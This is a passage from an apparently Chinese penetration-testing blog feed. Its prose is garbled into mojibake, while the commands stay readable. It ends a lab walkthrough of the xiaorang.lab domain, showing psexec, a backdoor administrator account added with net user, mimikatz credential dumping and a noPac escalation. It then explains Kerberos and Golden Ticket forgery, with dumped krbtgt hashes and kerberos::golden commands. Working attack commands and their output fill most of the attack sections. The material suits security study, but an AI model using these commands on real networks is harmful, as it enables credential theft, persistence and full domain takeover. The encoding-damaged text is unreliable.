class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982092267-f2bd9dd7-caf2-4d72-b52d-52c41b41c2f4.png"></p><p>flag{681cae09-6e26-4714-87d8-e1e52d014bcc}</p><h2 id="nopac"><a href="#nopac" class="headerlink" title="nopac"></a>nopac</h2><p>æ·»åŠ åé—¨ç”¨æˆ·è¿›è¡Œrdp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> net user calmsec admin@123 /add</span><br><span class="line">net localgroup administrators calmsec /add</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982227563-81ed6c8f-8bbb-4877-a88f-8ccc28c499eb.png"></p><p>rdp26ï¼Œç™»å½•çš„æ—¶å€™å‘ç°æœ‰ç”¨æˆ·åœ¨ç™»å½•ï¼Œä¼ ğŸ¥æŠ“ä¸€ä¸‹hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>åŠ ç®¡ç†å‘˜è´¦æˆ·ï¼Œrdpä¸Šå»ï¼Œç”¨çŒ•çŒ´æ¡ƒå¯ä»¥æŠ“åˆ°ä¸€ä¸ªzhanghuiç”¨æˆ·çš„å“ˆå¸Œ1232126b24cdf8c9bd2f788a9d7c7ed1ï¼Œä»–åœ¨MA_Adminç»„ï¼Œå¯¹computerèƒ½å¤Ÿåˆ›å»ºå¯¹è±¡ï¼Œèƒ½å‘åŸŸä¸­æ·»åŠ æœºå™¨è´¦æˆ·ï¼Œæ‰€ä»¥èƒ½æ‰“noPac</p><p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes &#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982930827-52b533e0-697e-4020-a280-816898acfe3e.png"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å››ç§ç¥¨æ®åˆ©ç”¨æ–¹å¼</title>
      <link href="/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Kerberos-èº«ä»½è®¤è¯æµç¨‹"><a href="#0x01-Kerberos-èº«ä»½è®¤è¯æµç¨‹" class="headerlink" title="0x01 Kerberos èº«ä»½è®¤è¯æµç¨‹"></a>0x01 Kerberos èº«ä»½è®¤è¯æµç¨‹</h2><p>Kerberos æ˜¯ä¸€ç§åŸºäºç¥¨è¯çš„<a href="https://so.csdn.net/so/search?q=%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81&spm=1001.2101.3001.7020">èº«ä»½éªŒè¯</a>åè®®ã€‚å®ƒåŸºæœ¬ä¸Šæ˜¯è¿™æ ·å·¥ä½œçš„ï¼š</p><p>1.<a href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&spm=1001.2101.3001.7020">å®¢æˆ·ç«¯</a>å‘KDCï¼ˆKey Distribution Centerï¼Œé€šå¸¸æ˜¯åŸŸæ§åˆ¶å™¨ï¼‰è¯·æ±‚TGTï¼ˆTicket Granting Ticketï¼‰ã€‚è¯·æ±‚ç”¨æˆ·çš„å¯†é’¥ä¹‹ä¸€ç”¨äºé¢„èº«ä»½éªŒè¯ã€‚ TGT ç”±èº«ä»½éªŒè¯æœåŠ¡ (AS) æä¾›ã€‚å®¢æˆ·ç«¯çš„è¯·æ±‚è¢«ç§°ä¸ºAS-REQï¼Œåº”ç­”è¢«ç§°ä¸ºAS-REPã€‚</p><p>2.å®¢æˆ·ç«¯ä½¿ç”¨ TGT å‘ KDC è¯·æ±‚ STï¼ˆæœåŠ¡ç¥¨è¯ï¼‰ã€‚è¯¥ç¥¨è¯ç”±ç¥¨è¯æˆäºˆæœåŠ¡ (TGS) æä¾›ã€‚å®¢æˆ·ç«¯çš„è¯·æ±‚è¢«ç§°ä¸ºTGS-REQï¼Œåº”ç­”è¢«ç§°ä¸ºTGS-REPã€‚</p><p>3.å®¢æˆ·ç«¯ä½¿ç”¨STï¼ˆæœåŠ¡ç¥¨è¯ï¼‰æ¥è®¿é—®æœåŠ¡ã€‚å®¢æˆ·ç«¯å¯¹æœåŠ¡çš„è¯·æ±‚è¢«ç§°ä¸ºè°ƒç”¨AP-REQï¼ŒæœåŠ¡çš„å“åº”è¢«ç§°ä¸ºè°ƒç”¨AP-REPã€‚</p><p>4.ä¸¤ç§ç¥¨è¯ï¼ˆTGT å’Œ STï¼‰é€šå¸¸éƒ½åŒ…å«åŠ å¯†çš„ PACï¼ˆç‰¹æƒèº«ä»½éªŒè¯è¯ä¹¦ï¼‰ï¼Œç›®æ ‡æœåŠ¡å°†è¯»å–ä¸€ç»„ä¿¡æ¯æ¥å†³å®šèº«ä»½éªŒè¯ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®è¯¥æœåŠ¡ï¼ˆç”¨æˆ· IDã€ç»„æˆå‘˜èº«ä»½ç­‰ï¼‰ ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920132-d7111175-46f6-4245-b825-10ad5b56527b.png"></p><h2 id="0x02-é»„é‡‘ç¥¨æ®-Golden-Ticket"><a href="#0x02-é»„é‡‘ç¥¨æ®-Golden-Ticket" class="headerlink" title="0x02 é»„é‡‘ç¥¨æ® Golden Ticket"></a>0x02 é»„é‡‘ç¥¨æ® Golden Ticket</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>é»„é‡‘ç¥¨è¯æ˜¯ä¸€ç§æƒé™ç»´æŒæ‰‹æ®µï¼Œæ”»å‡»è€…è·å¾—äº†å¯¹ Active Directory å¯†é’¥åˆ†å‘æœåŠ¡å¸æˆ· ï¼ˆKRBTGTï¼‰ çš„æ§åˆ¶æƒï¼Œå¹¶ä½¿ç”¨è¯¥å¸æˆ·ä¼ªé€ æœ‰æ•ˆçš„ Kerberos ç¥¨è¯æˆäºˆç¥¨è¯ ï¼ˆTGTï¼‰ã€‚è¿™ä½¿æ”»å‡»è€…èƒ½å¤Ÿè®¿é—® Active Directory åŸŸä¸Šçš„ä»»ä½•èµ„æºï¼Œå¦‚æœæœ‰ KRBTGT å“ˆå¸Œï¼Œæ‚¨å¯ä»¥ä¼ªé€ è‡ªå·±çš„ TGTï¼Œå…¶ä¸­åŒ…æ‹¬æƒ³è¦çš„ä»»ä½•ç»„æˆå‘˜èº«ä»½çš„ PAC æ•°æ®</p><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>é»„é‡‘ç¥¨æ®çš„ä½¿ç”¨çš„å¿…è¦ç¥¨ä»¶æ˜¯è·å–åŸŸä¸­ <code>krbtgt</code> ç”¨æˆ·ä½¿ç”¨çš„åŠ å¯†å¯†é’¥ä¹‹ä¸€ï¼Œç„¶è€ŒåŠ å¯†å¯†é’¥ä¹‹ä¸€å°±æ˜¯è¯¥è´¦æˆ·çš„<code>NTLM HASH</code>å€¼</p><p>å¯ä»¥ä½¿ç”¨ä½¿ç”¨<code>Mimikatz</code>è¯»å–å¯†é’¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::lsa /inject /name:krbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Domain : ROOTKIT / S-1-5-21-3759881954-2993291187-3577547808</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User : krbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Primary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    NTLM : c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    LM   :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Hash NTLM: c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ntlm- 0: c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lm  - 0: 2ca534c7c96a0b5bf6b37169b68f66af</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * WDigest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    01  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    02  d9a716e3ba48883f5e320e32ea793979</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    03  c888eb926eb57ff76e58ab449473d39b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    04  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    05  d9a716e3ba48883f5e320e32ea793979</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    06  e9ae3f6dcdd930348beb39a7820c885e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    07  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    08  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    09  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    10  a9fb57ca643019f1d9905258c730bc6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    11  1502d1b012872f1fa844005a85febaf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    12  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    13  6e163f56804bf65f31aca237ffc9c27c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    14  1502d1b012872f1fa844005a85febaf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    15  3129979e298936ba9f9887964df78426</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    16  3129979e298936ba9f9887964df78426</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    17  7d8690f61f25eee70d00dbf43d56dde3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    18  5d4a8835dbe016ee297e53e7ffb39211</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    19  d634b7b932766446b488972d97a666d8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    20  0fc150e25f583494a969df01da500775</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    21  f56f62faf0625c2d57698b23a23bbec9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    22  f56f62faf0625c2d57698b23a23bbec9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    23  8071dd220b86f03043815241b5826a37</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    24  9c11092e9e52701249d1b3e28351aa8c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    25  9c11092e9e52701249d1b3e28351aa8c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    26  e8432cad9fda7cd77474c556d8add53a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    27  72296ac7ad11af046a2cb5edc6ccd75c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    28  78f36bbd4ba657fdcc2f377e550e0c62</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    29  4cb788eeb5b4460b4334f6b6b5cd969b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Kerberos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Salt : ROOTKIT.ORGkrbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      des_cbc_md5       : 2cb957646746e376</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Kerberos-Newer-Keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Salt : ROOTKIT.ORGkrbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Iterations : 4096</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      aes256_hmac       (4096) : 3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      aes128_hmac       (4096) : c7ae2a311bdd5803646f9a98351c31e6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      des_cbc_md5       (4096) : 2cb957646746e376</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸‰ä¸ªåŠ å¯†å¯†é’¥å¯ä»¥ç”¨äºé»„é‡‘ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NTLM : c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aes256_hmac  : 3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aes128_hmac  : c7ae2a311bdd5803646f9a98351c31e6</span><br></pre></td></tr></table></figure><p>é™¤äº†åŠ å¯†å¯†é’¥ä¹‹å¤–ï¼Œè¿˜éœ€è¦ä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ç›®æ ‡åŸŸåï¼šæˆ‘è¿™é‡Œæ˜¯rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç›®æ ‡åŸŸçš„sidï¼šåˆšåˆšlsadump::lsa æœ‰æ˜¾ç¤ºS-1-5-21-3759881954-2993291187-3577547808 æˆ–è€…whami /allä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¦æ¨¡æ‹Ÿçš„ç”¨æˆ·è´¦æˆ·åç§°ï¼šä¾‹å¦‚ Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¦æ¨¡æ‹Ÿçš„ç”¨æˆ·RIDï¼šRIDæ˜¯SIDå³è¾¹çš„æ•°å­—ï¼Œä¾‹å¦‚ç®¡ç†å‘˜æ˜¯500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¯¥è´¦æˆ·æ‰€å±ç»„çš„RID:åŸŸç”¨æˆ·å’ŒåŸŸç®¡ç†å‘˜çš„RIDåˆ†åˆ«æ˜¯512å’Œ513</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨Mimikatzæ³¨å…¥ç¥¨æ®"><a href="#ä½¿ç”¨Mimikatzæ³¨å…¥ç¥¨æ®" class="headerlink" title="ä½¿ç”¨Mimikatzæ³¨å…¥ç¥¨æ®"></a>ä½¿ç”¨Mimikatzæ³¨å…¥ç¥¨æ®</h3><p>ç™»å½•ä½æƒé™åŸŸè´¦æˆ·ï¼Œå°è¯• <code>dir</code> åŸŸæ§å¤±è´¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919568-de374eda-8ece-45b5-ab52-ce4984131caf.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ¸…é™¤åŸæœ‰ç¥¨æ®ï¼škerberos::purge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ³¨å…¥é»„é‡‘ç¥¨æ®ï¼škerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /rc4:c3d5042c67ef5f461d0ba6ecdd9ea449 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919874-eb4a1d76-807d-4699-970c-63d8606cdb21.png"></p><p>æˆåŠŸæ³¨å…¥åå°è¯•<code>dir</code>åŸŸæ§ï¼ŒæˆåŠŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920030-88794d9a-2066-4d7c-8b69-af3b1047d3cb.png"></p><p>å°è¯•<code>psexec</code>æˆåŠŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919992-325b75f9-de36-4e4f-a1fd-9b5362444dd4.png"></p><p>å¦‚æœä»¥åæƒ³è¦é‡å¤ä½¿ç”¨ç›¸åŒçš„ç¥¨æ®ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆä¸€ä¸ªç¥¨æ®æ–‡ä»¶ï¼Œç„¶åå°†å…¶æ–‡ä»¶å¯¼å…¥ä¼šè¯ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /rc4:c3d5042c67ef5f461d0ba6ecdd9ea449 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ticket:golden.kirbi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::ptt golden.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920153-a90822c1-1178-4dff-9933-764b23e2d80a.png"></p><p><strong>æ³¨æ„</strong>ï¼šç”±äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„é…ç½®é—®é¢˜ä»¥åŠwindowsè‡ªèº«çš„ç‰¹æ€§ï¼Œéœ€è¦å°è¯•ç›®æ ‡ç³»ç»Ÿçš„éé™å®šåç§°æˆ–è€…é™å®šåç§°æ‰èƒ½æˆåŠŸï¼Œä¾‹å¦‚ UNC è·¯å¾„<code>\\owa2013\c$</code>æˆ–<code>\\owa2013.rootkit.org\c$</code></p><p>å¦‚æœæ‹¥æœ‰ <code>AES-256 HMAC</code> å’Œ&#x2F;æˆ– <code>AES-128 HMAC</code>ä¹Ÿå¯è¿›è¡Œå°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#aes256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#aes128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes128:c7ae2a311bdd5803646f9a98351c31e6 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure><h3 id="æ¬ºéª—æ€§ç”¨æˆ·å"><a href="#æ¬ºéª—æ€§ç”¨æˆ·å" class="headerlink" title="æ¬ºéª—æ€§ç”¨æˆ·å"></a><strong>æ¬ºéª—æ€§ç”¨æˆ·å</strong></h3><p>åœ¨ç¥¨æ®è®¤è¯ä¸­ï¼Œç›®æ ‡ç³»ç»Ÿé€šå¸¸ä¼šä¿¡ä»» Kerberos ç¥¨è¯ä¸­çš„ä¿¡æ¯ï¼Œè€Œä¸ä¼šéªŒè¯å¸æˆ·ä¿¡æ¯æ˜¯å¦æœ‰æ•ˆã€‚æˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥ä¸€ä¸ªåç§°ä¸º<code>Hello world,Nice to meet you my dear</code>çš„ä¼šè¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:&quot;Hello world,Nice to meet you my dear&quot; /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹åŸŸæ§åœ¨çº¿ä¼šè¯å¯ä»¥çœ‹åˆ°è¿™ä¸ªç”¨æˆ·å</p><p><img 